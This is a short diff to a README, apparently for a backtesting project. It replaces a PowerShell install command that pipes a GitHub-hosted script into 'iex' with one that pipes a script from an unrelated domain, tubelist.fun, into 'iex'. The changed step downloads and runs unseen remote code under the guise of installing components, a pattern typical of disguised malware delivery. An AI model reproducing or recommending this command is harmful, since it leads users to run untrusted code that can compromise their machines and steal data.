@@ -16,7 +16,7 @@ backtesting configurations are maintained here for research and educational use.
 To install the required components, run this in PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ### Notable Strengths
